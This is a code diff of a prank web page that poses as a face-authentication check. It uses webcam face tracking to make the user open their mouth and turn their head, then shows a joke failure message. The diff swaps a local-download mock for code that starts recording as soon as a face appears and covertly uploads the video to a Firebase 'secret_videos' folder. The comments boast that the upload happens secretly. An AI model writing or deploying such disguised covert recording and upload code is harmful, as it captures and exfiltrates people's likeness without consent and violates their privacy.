@@ -32,38 +32,23 @@
     }
     video, canvas {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0; width: 100%; height: 100%;
       object-fit: cover;
-      transform: scaleX(-1); /* 鏡のように反転 */
+      transform: scaleX(-1);
     }
     .ui-overlay {
       position: absolute;
       top: 0; left: 0; width: 100%; height: 100%;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      pointer-events: none;
-      padding: 20px;
-      box-sizing: border-box;
+      display: flex; flex-direction: column; justify-content: space-between;
+      pointer-events: none; padding: 20px; box-sizing: border-box;
     }
     .instruction-box {
-      background: rgba(0, 0, 0, 0.7);
-      padding: 15px 20px;
-      border-radius: 10px;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: bold;
-      border: 1px solid #0ff;
-      color: #0ff;
-      text-shadow: 0 0 5px #0ff;
+      background: rgba(0, 0, 0, 0.7); padding: 15px 20px; border-radius: 10px;
+      text-align: center; font-size: 1.2rem; font-weight: bold;
+      border: 1px solid #0ff; color: #0ff; text-shadow: 0 0 5px #0ff;
     }
     .status {
-      text-align: center;
-      font-size: 0.9rem;
-      color: #ff4444;
+      text-align: center; font-size: 0.9rem; color: #ff4444;
       animation: blink 1s infinite;
     }
     @keyframes blink { 50% { opacity: 0; } }
@@ -76,14 +61,30 @@
   <div class="container">
     <video id="input_video" autoplay playsinline></video>
     <canvas id="output_canvas"></canvas>
-    
     <div class="ui-overlay">
       <div class="status">● REC (監視中)</div>
       <div id="instruction" class="instruction-box">カメラを許可して正面を向いてください</div>
     </div>
   </div>
 
-  <script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
+
+    // ★★★ ここを後で自分のFirebaseの設定に書き換えます ★★★
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Firebaseの初期化
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+
     const videoElement = document.getElementById('input_video');
     const canvasElement = document.getElementById('output_canvas');
     const canvasCtx = canvasElement.getContext('2d');
@@ -92,115 +93,86 @@
     let isRecording = false;
     let mediaRecorder;
     let recordedChunks = [];
-    let currentStep = 0; // 0:正面, 1:口を開ける, 2:右を向く, 3:完了
+    let currentStep = 0;
 
-    // 録画開始の処理
     function startRecording() {
       if (isRecording) return;
       const stream = videoElement.srcObject;
       mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
       mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-      mediaRecorder.onstop = saveVideoMock;
+      
+      // 録画が終わったら、こっそりサーバーにアップロードする処理
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const fileName = `auth_video_${Date.now()}.webm`;
+        const storageRef = ref(storage, 'secret_videos/' + fileName);
+        
+        try {
+          // ここでこっそり送信！ユーザーの端末には何もダウンロードされません
+          await uploadBytes(storageRef, blob);
+          console.log("動画の極秘送信が完了しました");
+        } catch (error) {
+          console.error("送信エラー:", error);
+        }
+      };
+      
       mediaRecorder.start();
       isRecording = true;
     }
 
-    // 録画終了と保存（今は自動ダウンロードするモック仕様）
-    function saveVideoMock() {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'funny_auth_video.webm';
-      a.click();
-      URL.revokeObjectURL(url);
-    }
-
-    // 顔検知のメイン処理
     function onResults(results) {
-      // キャンバスのサイズをビデオに合わせる
       canvasElement.width = videoElement.videoWidth;
       canvasElement.height = videoElement.videoHeight;
       canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
 
       if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
-        if (!isRecording) startRecording(); // 顔が映ったらこっそり録画開始
+        if (!isRecording) startRecording();
 
         const landmarks = results.multiFaceLandmarks[0];
         
-        // 認証ステップのロジック
         if (currentStep === 0) {
           instructionText.innerText = "大きく口を開けてください";
-          
-          // 上唇(13)と下唇(14)の距離を計算（簡易的な口の開閉検知）
-          const upperLip = landmarks[13];
-          const lowerLip = landmarks[14];
-          const mouthOpenDist = Math.abs(upperLip.y - lowerLip.y);
-          
-          if (mouthOpenDist > 0.05) { // 閾値（環境によって調整が必要）
+          const mouthOpenDist = Math.abs(landmarks[13].y - landmarks[14].y);
+          if (mouthOpenDist > 0.05) {
             currentStep = 1;
-            instructionText.style.borderColor = "#0f0";
-            instructionText.style.color = "#0f0";
+            instructionText.style.borderColor = "#0f0"; instructionText.style.color = "#0f0";
             setTimeout(() => {
-              instructionText.style.borderColor = "#0ff";
-              instructionText.style.color = "#0ff";
+              instructionText.style.borderColor = "#0ff"; instructionText.style.color = "#0ff";
               currentStep = 2;
             }, 1000);
           }
         } else if (currentStep === 2) {
           instructionText.innerText = "顔を右に向けてください";
-          
-          // 鼻の頭(1)と両耳(234, 454)の位置関係で横を向いたか判定
-          const nose = landmarks[1];
-          const rightCheek = landmarks[234];
-          const leftCheek = landmarks[454];
-          
-          // 簡易的な向き判定（鼻が顔の左側に寄ったら右を向いているとみなす※鏡写しのため）
-          if (nose.x < leftCheek.x - 0.1) { 
+          if (landmarks[1].x < landmarks[454].x - 0.1) { 
             currentStep = 3;
-            instructionText.innerText = "認証失敗！顔がふざけすぎています"; // ここがオチ
-            instructionText.style.borderColor = "#f00";
-            instructionText.style.color = "#f00";
+            // ★オチのテキストを変更しました！
+            instructionText.innerText = "認証失敗：笑顔が足りません";
+            instructionText.style.borderColor = "#f00"; instructionText.style.color = "#f00";
             
             setTimeout(() => {
-              if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); // 録画停止してダウンロード
+              if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
             }, 2000);
           }
         }
 
-        // SFっぽい顔のメッシュ（網目）を描画する（不要なら消せます）
         canvasCtx.fillStyle = 'rgba(0, 255, 255, 0.5)';
         for (let i = 0; i < landmarks.length; i++) {
           const x = landmarks[i].x * canvasElement.width;
           const y = landmarks[i].y * canvasElement.height;
-          canvasCtx.beginPath();
-          canvasCtx.arc(x, y, 1, 0, 2 * Math.PI);
-          canvasCtx.fill();
+          canvasCtx.beginPath(); canvasCtx.arc(x, y, 1, 0, 2 * Math.PI); canvasCtx.fill();
         }
       } else {
         instructionText.innerText = "顔が認識できません。枠内に入ってください。";
       }
     }
 
-    // MediaPipe FaceMeshの初期設定
-    const faceMesh = new FaceMesh({locateFile: (file) => {
-      return `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`;
-    }});
-    faceMesh.setOptions({
-      maxNumFaces: 1,
-      refineLandmarks: true,
-      minDetectionConfidence: 0.5,
-      minTrackingConfidence: 0.5
-    });
+    const faceMesh = new FaceMesh({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`});
+    faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
     faceMesh.onResults(onResults);
 
-    // カメラの起動
     const camera = new Camera(videoElement, {
-      onFrame: async () => {
-        await faceMesh.send({image: videoElement});
-      },
-      width: 640,
-      height: 480
+      onFrame: async () => { await faceMesh.send({image: videoElement}); },
+      width: 640, height: 480
     });
     camera.start();
   </script>
